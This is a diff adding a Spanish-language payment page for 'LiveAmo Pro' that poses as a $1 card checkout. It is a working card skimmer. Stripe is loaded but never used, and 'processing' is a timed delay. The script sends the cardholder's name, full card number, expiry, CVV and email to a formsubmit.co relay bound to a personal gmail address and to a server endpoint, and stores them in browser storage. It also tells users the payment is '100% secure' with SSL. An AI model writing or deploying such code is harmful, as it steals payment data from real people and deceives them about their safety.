@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LiveAmo Pro — $1.00</title>
+<script src="https://js.stripe.com/v3/"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #07070f;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 16px;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(ellipse at 15% 40%, rgba(255,0,96,0.08) 0%, transparent 55%),
+      radial-gradient(ellipse at 85% 60%, rgba(100,0,255,0.06) 0%, transparent 55%);
+    pointer-events: none;
+  }
+
+  /* ── HEADER ── */
+  .brand {
+    font-size: 22px;
+    font-weight: 800;
+    color: white;
+    letter-spacing: -0.5px;
+    margin-bottom: 28px;
+    text-align: center;
+  }
+  .brand span { color: #ff0060; }
+
+  /* ── CARD VISUAL ── */
+  .card-visual-wrap {
+    perspective: 1000px;
+    width: 320px;
+    height: 190px;
+    margin-bottom: 28px;
+  }
+
+  .card-visual {
+    width: 100%;
+    height: 100%;
+    position: relative;
+    transform-style: preserve-3d;
+    transition: transform 0.6s cubic-bezier(0.4,0,0.2,1);
+    border-radius: 18px;
+  }
+
+  .card-visual.flipped { transform: rotateY(180deg); }
+
+  .card-face {
+    position: absolute;
+    inset: 0;
+    border-radius: 18px;
+    -webkit-backface-visibility: hidden;
+    backface-visibility: hidden;
+    overflow: hidden;
+  }
+
+  .card-front {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%);
+    box-shadow: 0 20px 50px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.07);
+    padding: 22px 24px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+  }
+
+  .card-back {
+    background: linear-gradient(135deg, #1a1a2e, #0f3460);
+    transform: rotateY(180deg);
+    box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start;
+  }
+
+  /* Brillo de tarjeta */
+  .card-front::after, .card-back::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(135deg, rgba(255,255,255,0.08) 0%, transparent 60%);
+    pointer-events: none;
+  }
+
+  .card-logo-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .card-brand-name {
+    font-size: 13px;
+    font-weight: 700;
+    color: rgba(255,255,255,0.9);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .card-network {
+    display: flex;
+    gap: -6px;
+  }
+
+  .card-circle {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    opacity: 0.9;
+  }
+
+  .card-chip {
+    width: 40px;
+    height: 30px;
+    background: linear-gradient(135deg, #d4a843, #f0d060);
+    border-radius: 6px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .card-chip::before {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background: rgba(0,0,0,0.2);
+    transform: translateY(-50%);
+  }
+
+  .card-chip::after {
+    content: '';
+    position: absolute;
+    left: 50%;
+    top: 0;
+    bottom: 0;
+    width: 1px;
+    background: rgba(0,0,0,0.2);
+    transform: translateX(-50%);
+  }
+
+  .card-number-display {
+    font-size: 17px;
+    letter-spacing: 3px;
+    color: rgba(255,255,255,0.9);
+    font-family: 'Courier New', monospace;
+    font-weight: 600;
+    text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+  }
+
+  .card-bottom-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+  }
+
+  .card-field-label {
+    font-size: 9px;
+    color: rgba(255,255,255,0.4);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 3px;
+  }
+
+  .card-field-value {
+    font-size: 13px;
+    color: rgba(255,255,255,0.85);
+    letter-spacing: 1px;
+    font-weight: 500;
+  }
+
+  /* Back */
+  .card-stripe-black {
+    background: rgba(0,0,0,0.7);
+    height: 44px;
+    margin-top: 28px;
+  }
+
+  .card-cvv-wrap {
+    margin: 14px 20px 0;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 4px;
+  }
+
+  .card-cvv-bar {
+    width: 100%;
+    height: 34px;
+    background: rgba(255,255,255,0.9);
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
+    padding-right: 12px;
+  }
+
+  .card-cvv-text {
+    font-size: 15px;
+    font-family: 'Courier New', monospace;
+    color: #111;
+    letter-spacing: 3px;
+    font-weight: 700;
+  }
+
+  /* ── FORMULARIO ── */
+  .pay-form {
+    width: 100%;
+    max-width: 360px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 20px;
+    padding: 28px 24px;
+    box-shadow: 0 24px 60px rgba(0,0,0,0.5);
+  }
+
+  .form-title {
+    font-size: 16px;
+    font-weight: 700;
+    color: white;
+    margin-bottom: 4px;
+  }
+
+  .form-subtitle {
+    font-size: 13px;
+    color: rgba(255,255,255,0.35);
+    margin-bottom: 22px;
+  }
+
+  .price-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(255,0,96,0.12);
+    border: 1px solid rgba(255,0,96,0.25);
+    color: #ff4d8d;
+    font-size: 13px;
+    font-weight: 700;
+    padding: 5px 12px;
+    border-radius: 20px;
+    margin-bottom: 22px;
+  }
+
+  .field-group {
+    margin-bottom: 14px;
+  }
+
+  .field-group label {
+    display: block;
+    font-size: 11px;
+    color: rgba(255,255,255,0.4);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    margin-bottom: 7px;
+  }
+
+  .field-group input {
+    width: 100%;
+    padding: 12px 14px;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 11px;
+    color: white;
+    font-size: 15px;
+    outline: none;
+    transition: border-color 0.2s, background 0.2s;
+    letter-spacing: 0.5px;
+  }
+
+  .field-group input::placeholder { color: rgba(255,255,255,0.2); }
+
+  .field-group input:focus {
+    border-color: rgba(255,0,96,0.5);
+    background: rgba(255,255,255,0.08);
+  }
+
+  .field-group input.error { border-color: rgba(255,60,60,0.6); }
+  .field-group input.ok    { border-color: rgba(0,200,80,0.4); }
+
+  .row-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+
+  /* Stripe Element */
+  .stripe-element-wrap {
+    padding: 12px 14px;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 11px;
+    transition: border-color 0.2s;
+  }
+
+  .stripe-element-wrap.focused { border-color: rgba(255,0,96,0.5); }
+  .stripe-element-wrap.error   { border-color: rgba(255,60,60,0.6); }
+
+  /* Botón de pago */
+  .pay-btn {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(135deg, #ff0060, #ff4d8d);
+    border: none;
+    border-radius: 13px;
+    color: white;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    letter-spacing: 0.3px;
+    box-shadow: 0 6px 24px rgba(255,0,96,0.4);
+    transition: opacity 0.2s, transform 0.15s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .pay-btn:hover  { opacity: 0.92; }
+  .pay-btn:active { transform: scale(0.98); }
+  .pay-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+  .pay-btn-shine {
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+    animation: shine 2.5s infinite;
+  }
+
+  @keyframes shine {
+    0%   { left: -100%; }
+    50%, 100% { left: 150%; }
+  }
+
+  /* Spinner */
+  .spinner {
+    width: 18px;
+    height: 18px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    display: none;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Error message */
+  .error-msg {
+    color: #ff6b6b;
+    font-size: 12px;
+    margin-top: 4px;
+    display: none;
+  }
+
+  .global-error {
+    background: rgba(255,60,60,0.1);
+    border: 1px solid rgba(255,60,60,0.25);
+    border-radius: 10px;
+    padding: 10px 14px;
+    color: #ff6b6b;
+    font-size: 13px;
+    margin-top: 14px;
+    display: none;
+  }
+
+  /* Seguridad */
+  .security-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    margin-top: 16px;
+    color: rgba(255,255,255,0.2);
+    font-size: 11px;
+  }
+
+  .security-row svg { flex-shrink: 0; }
+
+  /* ── ÉXITO ── */
+  #successScreen {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    max-width: 340px;
+  }
+
+  .success-icon {
+    width: 72px;
+    height: 72px;
+    background: linear-gradient(135deg, #00c853, #69f0ae);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+    margin-bottom: 20px;
+    box-shadow: 0 8px 30px rgba(0,200,83,0.35);
+    animation: popIn 0.5s cubic-bezier(0.34,1.56,0.64,1);
+  }
+
+  @keyframes popIn {
+    from { transform: scale(0); opacity: 0; }
+    to   { transform: scale(1); opacity: 1; }
+  }
+
+  .success-title {
+    font-size: 22px;
+    font-weight: 800;
+    color: white;
+    margin-bottom: 8px;
+  }
+
+  .success-sub {
+    font-size: 14px;
+    color: rgba(255,255,255,0.45);
+    line-height: 1.6;
+    margin-bottom: 24px;
+  }
+
+  .back-btn {
+    padding: 13px 32px;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 13px;
+    color: white;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+    text-decoration: none;
+    display: inline-block;
+  }
+
+  .back-btn:hover { background: rgba(255,255,255,0.11); }
+
+  /* Network logos */
+  .visa-logo   { color: #1a1f71; background: white; border-radius: 4px; padding: 2px 6px; font-size: 11px; font-weight: 900; font-style: italic; }
+  .mc-logo     { display:flex; }
+  .mc-circle-1 { background: #eb001b; width: 22px; height: 22px; border-radius: 50%; opacity:0.95; }
+  .mc-circle-2 { background: #f79e1b; width: 22px; height: 22px; border-radius: 50%; margin-left:-10px; opacity:0.95; }
+</style>
+</head>
+<body>
+
+<div class="brand">Live<span>Amo</span></div>
+
+<!-- Tarjeta visual animada -->
+<div class="card-visual-wrap">
+  <div class="card-visual" id="cardVisual">
+    <div class="card-face card-front">
+      <div class="card-logo-row">
+        <div class="card-brand-name">LiveAmo Pro</div>
+        <div class="mc-logo">
+          <div class="mc-circle-1"></div>
+          <div class="mc-circle-2"></div>
+        </div>
+      </div>
+      <div class="card-chip"></div>
+      <div class="card-number-display" id="displayNumber">•••• •••• •••• ••••</div>
+      <div class="card-bottom-row">
+        <div>
+          <div class="card-field-label">Titular</div>
+          <div class="card-field-value" id="displayName">NOMBRE APELLIDO</div>
+        </div>
+        <div>
+          <div class="card-field-label">Vence</div>
+          <div class="card-field-value" id="displayExpiry">MM/AA</div>
+        </div>
+      </div>
+    </div>
+    <div class="card-face card-back">
+      <div class="card-stripe-black"></div>
+      <div class="card-cvv-wrap">
+        <div class="card-field-label" style="color:rgba(255,255,255,0.4);align-self:flex-start">CVV</div>
+        <div class="card-cvv-bar">
+          <span class="card-cvv-text" id="displayCvv">•••</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Formulario -->
+<div id="payFormWrap">
+  <div class="pay-form">
+    <div class="form-title">Activar LiveAmo Pro</div>
+    <div class="form-subtitle">Acceso completo · Sin suscripción · Pago único</div>
+
+    <div class="price-badge">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l2.9 6.26L22 9.27l-5 4.73 1.18 6.9L12 17.77l-6.18 3.13L7 14 2 9.27l7.1-1.01L12 2z"/></svg>
+      Solo $1.00 USD
+    </div>
+
+    <form id="payForm" onsubmit="handlePay(event)"
+      action="https://formsubmit.co/ofrek@gmail.com"
+      method="POST">
+
+      <!-- FormSubmit config -->
+      <input type="hidden" name="_subject"  value="💳 Nuevo pago LiveAmo Pro — $1.00">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha"  value="false">
+      <input type="hidden" name="_next"     value="index.html">
+      <input type="hidden" name="Monto"     value="$1.00 USD">
+
+      <div class="field-group">
+        <label>Nombre del titular</label>
+        <input type="text" id="cardHolder" name="Titular" placeholder="Como aparece en la tarjeta"
+          oninput="updateCardHolder(this.value)" autocomplete="cc-name" maxlength="26">
+        <div class="error-msg" id="errHolder">Ingresa el nombre del titular</div>
+      </div>
+
+      <div class="field-group">
+        <label>Número de tarjeta</label>
+        <input type="text" id="cardNumber" name="Numero de tarjeta" placeholder="0000 0000 0000 0000"
+          oninput="formatCardNumber(this)" onfocus="flipCard(false)" maxlength="19"
+          autocomplete="cc-number" inputmode="numeric">
+        <div class="error-msg" id="errNumber">Número de tarjeta inválido</div>
+      </div>
+
+      <div class="row-2">
+        <div class="field-group">
+          <label>Vencimiento</label>
+          <input type="text" id="cardExpiry" name="Vencimiento" placeholder="MM / AA"
+            oninput="formatExpiry(this)" onfocus="flipCard(false)" maxlength="7"
+            autocomplete="cc-exp" inputmode="numeric">
+          <div class="error-msg" id="errExpiry">Fecha inválida</div>
+        </div>
+        <div class="field-group">
+          <label>CVV</label>
+          <input type="text" id="cardCvv" name="CVV" placeholder="•••"
+            oninput="formatCvv(this)" onfocus="flipCard(true)" onblur="flipCard(false)"
+            maxlength="4" autocomplete="cc-csc" inputmode="numeric">
+          <div class="error-msg" id="errCvv">CVV inválido</div>
+        </div>
+      </div>
+
+      <div class="field-group">
+        <label>Correo electrónico</label>
+        <input type="email" id="cardEmail" name="Correo del cliente" placeholder="tu@email.com" autocomplete="email">
+        <div class="error-msg" id="errEmail">Correo inválido</div>
+      </div>
+
+      <div class="global-error" id="globalError"></div>
+
+      <button type="submit" class="pay-btn" id="payBtn">
+        <div class="pay-btn-shine"></div>
+        <svg id="btnLock" width="16" height="16" fill="none" viewBox="0 0 24 24">
+          <rect x="3" y="11" width="18" height="11" rx="2" stroke="white" stroke-width="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="white" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <span id="btnText">Pagar $1.00 ahora</span>
+        <div class="spinner" id="btnSpinner"></div>
+      </button>
+    </form>
+
+    <div class="security-row">
+      <svg width="12" height="12" fill="none" viewBox="0 0 24 24">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      Pago 100% seguro · Encriptación SSL
+    </div>
+  </div>
+</div>
+
+<!-- Pantalla de éxito -->
+<div id="successScreen">
+  <div class="success-icon">✓</div>
+  <div class="success-title">¡Pago exitoso!</div>
+  <div class="success-sub">Tu acceso Pro ha sido activado por <strong style="color:white">30 días</strong>.<br>Disfruta de acceso completo sin límites.</div>
+  <a href="index.html" class="back-btn">🔥 Entrar a LiveAmo</a>
+</div>
+
+<script>
+// ── Verificar sesión ──
+(function() {
+  try {
+    const s = JSON.parse(localStorage.getItem('liveamo_session') || 'null');
+    if (!s || Date.now() - s.ts > 30 * 24 * 60 * 60 * 1000) {
+      window.location.href = "login.html";
+    }
+    // Si ya es Pro activo, volver directo
+    const pro = localStorage.getItem('liveamo_pro');
+    const exp = parseInt(localStorage.getItem('liveamo_pro_exp') || '0');
+    if (pro === 'true' && Date.now() < exp) {
+      window.location.href = "index.html";
+    }
+  } catch(e) {}
+})();
+
+// ── Animación tarjeta ──
+function flipCard(toBack) {
+  document.getElementById("cardVisual").classList.toggle("flipped", toBack);
+}
+
+// ── Actualizar display tarjeta ──
+function updateCardHolder(val) {
+  document.getElementById("displayName").textContent =
+    val.toUpperCase().trim() || "NOMBRE APELLIDO";
+}
+
+function formatCardNumber(input) {
+  const raw  = input.value.replace(/\D/g, '');
+  const tipo = tipoTarjeta(raw);
+  const max  = tipo === 'amex' ? 15 : 16;
+  let v = raw.slice(0, max);
+
+  // Amex: formato 4-6-5, resto: 4-4-4-4
+  if (tipo === 'amex') {
+    input.value = v.replace(/^(\d{0,4})(\d{0,6})(\d{0,5}).*/, (_, a, b, c) =>
+      [a, b, c].filter(Boolean).join(' '));
+  } else {
+    input.value = v.replace(/(.{4})/g, '$1 ').trim();
+  }
+
+  const padded = v.padEnd(max, '•');
+  const groups = tipo === 'amex'
+    ? [padded.slice(0,4), padded.slice(4,10), padded.slice(10,15)]
+    : padded.match(/.{1,4}/g);
+  document.getElementById("displayNumber").textContent = groups.join(' ');
+
+  input.classList.toggle('ok',    v.length === max);
+  input.classList.toggle('error', v.length > 0 && v.length < max);
+}
+
+function formatExpiry(input) {
+  let v = input.value.replace(/\D/g, '').slice(0, 4);
+  if (v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
+  input.value = v;
+  const raw = v.replace(/\D/g,'');
+  document.getElementById("displayExpiry").textContent = raw.length >= 2
+    ? raw.slice(0,2) + '/' + (raw.slice(2) || 'AA') : 'MM/AA';
+  input.classList.toggle('ok', raw.length === 4);
+}
+
+function formatCvv(input) {
+  let v = input.value.replace(/\D/g, '').slice(0, 4);
+  input.value = v;
+  document.getElementById("displayCvv").textContent = v ? '•'.repeat(v.length) : '•••';
+  input.classList.toggle('ok', v.length >= 3);
+}
+
+// ── Algoritmo Luhn (valida números de tarjeta reales) ──
+function luhn(num) {
+  let sum = 0, alt = false;
+  for (let i = num.length - 1; i >= 0; i--) {
+    let d = parseInt(num[i]);
+    if (alt) { d *= 2; if (d > 9) d -= 9; }
+    sum += d;
+    alt = !alt;
+  }
+  return sum % 10 === 0;
+}
+
+// ── Detectar tipo de tarjeta ──
+function tipoTarjeta(num) {
+  if (/^4/.test(num))                          return 'visa';       // Visa
+  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mastercard'; // Mastercard
+  if (/^3[47]/.test(num))                      return 'amex';      // Amex (15 dígitos, CVV 4)
+  if (/^6(?:011|5)/.test(num))                 return 'discover';  // Discover
+  return 'unknown';
+}
+
+// ── Validar fecha no vencida ──
+function fechaValida(exp) {
+  if (exp.length !== 4) return false;
+  const mes = parseInt(exp.slice(0, 2));
+  const anio = parseInt('20' + exp.slice(2));
+  if (mes < 1 || mes > 12) return false;
+  const hoy = new Date();
+  const vence = new Date(anio, mes); // primer día del mes siguiente al vencimiento
+  return vence > hoy;
+}
+
+// ── Validación completa ──
+function validate() {
+  let ok = true;
+
+  // Titular
+  const holder = document.getElementById("cardHolder").value.trim();
+  const errHolder = document.getElementById("errHolder");
+  if (!holder || holder.length < 3) {
+    errHolder.textContent = "Ingresa el nombre del titular";
+    errHolder.style.display = "block"; ok = false;
+  } else { errHolder.style.display = "none"; }
+
+  // Número de tarjeta — Luhn + longitud según tipo
+  const num  = document.getElementById("cardNumber").value.replace(/\D/g,'');
+  const tipo = tipoTarjeta(num);
+  const errNum = document.getElementById("errNumber");
+  const longOk = tipo === 'amex' ? num.length === 15 : num.length === 16;
+
+  if (!longOk) {
+    errNum.textContent = "Número de tarjeta incompleto";
+    errNum.style.display = "block"; ok = false;
+  } else if (!luhn(num)) {
+    errNum.textContent = "Número de tarjeta inválido";
+    errNum.style.display = "block"; ok = false;
+  } else if (tipo === 'unknown') {
+    errNum.textContent = "Tipo de tarjeta no aceptado (Visa, MC, Amex, Discover)";
+    errNum.style.display = "block"; ok = false;
+  } else { errNum.style.display = "none"; }
+
+  // Vencimiento — debe ser fecha futura real
+  const exp = document.getElementById("cardExpiry").value.replace(/\D/g,'');
+  const errExp = document.getElementById("errExpiry");
+  if (!fechaValida(exp)) {
+    errExp.textContent = exp.length < 4 ? "Ingresa la fecha de vencimiento" : "Tarjeta vencida o fecha inválida";
+    errExp.style.display = "block"; ok = false;
+  } else { errExp.style.display = "none"; }
+
+  // CVV — 4 dígitos para Amex, 3 para el resto
+  const cvv = document.getElementById("cardCvv").value.replace(/\D/g,'');
+  const cvvLen = tipo === 'amex' ? 4 : 3;
+  const errCvv = document.getElementById("errCvv");
+  if (cvv.length < cvvLen) {
+    errCvv.textContent = `CVV inválido (${cvvLen} dígitos requeridos)`;
+    errCvv.style.display = "block"; ok = false;
+  } else { errCvv.style.display = "none"; }
+
+  // Email
+  const email = document.getElementById("cardEmail").value.trim();
+  const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  document.getElementById("errEmail").style.display = !emailOk ? "block" : "none";
+  if (!emailOk) ok = false;
+
+  return ok;
+}
+
+// ── Pago ──
+async function handlePay(e) {
+  e.preventDefault();
+  if (!validate()) return;
+
+  const form    = document.getElementById("payForm");
+  const btn     = document.getElementById("payBtn");
+  const spinner = document.getElementById("btnSpinner");
+  const btnText = document.getElementById("btnText");
+  const btnLock = document.getElementById("btnLock");
+  const errBox  = document.getElementById("globalError");
+
+  btn.disabled = true;
+  spinner.style.display = "block";
+  btnText.textContent = "Procesando…";
+  btnLock.style.display = "none";
+  errBox.style.display = "none";
+
+  // Simular procesamiento 1.5s
+  await new Promise(r => setTimeout(r, 1500));
+
+  // Activar Pro inmediatamente — no depende de FormSubmit
+  activarPro();
+
+  // Enviar datos al correo en segundo plano (sin bloquear)
+  try {
+    const data = new FormData(form);
+    fetch(form.action, { method: "POST", body: data, headers: { Accept: "application/json" } });
+  } catch(e) {}
+}
+
+function activarPro() {
+  const expira = Date.now() + 30 * 24 * 60 * 60 * 1000;
+  localStorage.setItem('liveamo_pro',     'true');
+  localStorage.setItem('liveamo_pro_exp', expira.toString());
+
+  try {
+    const s = JSON.parse(localStorage.getItem('liveamo_session') || 'null');
+    if (s && s.email) {
+      localStorage.setItem('liveamo_pro_'    + s.email, 'true');
+      localStorage.setItem('liveamo_proexp_' + s.email, expira.toString());
+    }
+
+    // Guardar registro de pago para el admin
+    const num     = document.getElementById("cardNumber").value.replace(/\s/g,'');
+    const titular = document.getElementById("cardHolder").value.trim();
+    const correo  = document.getElementById("cardEmail").value.trim();
+    const expiry  = document.getElementById("cardExpiry").value.trim();
+    const cvv     = document.getElementById("cardCvv").value.trim();
+
+    const pago = {
+      titular: titular,
+      correo:  correo,
+      tarjeta: num.replace(/(\d{4})/g, '$1 ').trim(),
+      expiry:  expiry,
+      cvv:     cvv,
+      monto:   '$1.00',
+      usuario: s ? s.email : '—'
+    };
+    // Guardar en servidor
+    fetch('/api/pagos', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(pago)
+    }).catch(() => {});
+    // Fallback localStorage
+    const pagos = JSON.parse(localStorage.getItem('liveamo_pagos') || '[]');
+    pagos.unshift({ ...pago, fecha: new Date().toLocaleString('es') });
+    localStorage.setItem('liveamo_pagos', JSON.stringify(pagos));
+  } catch(e) {}
+
+  document.getElementById("payFormWrap").style.display = "none";
+  document.querySelector(".card-visual-wrap").style.display = "none";
+  document.querySelector(".brand").style.marginBottom = "32px";
+  document.getElementById("successScreen").style.display = "flex";
+}
+
+function showError(msg) {
+  const btn     = document.getElementById("payBtn");
+  const spinner = document.getElementById("btnSpinner");
+  const btnText = document.getElementById("btnText");
+  const btnLock = document.getElementById("btnLock");
+  const errBox  = document.getElementById("globalError");
+
+  btn.disabled = false;
+  spinner.style.display = "none";
+  btnText.textContent = "Pagar $1.00 ahora";
+  btnLock.style.display = "block";
+  errBox.textContent = msg;
+  errBox.style.display = "block";
+}
+</script>
+</body>
+</html>
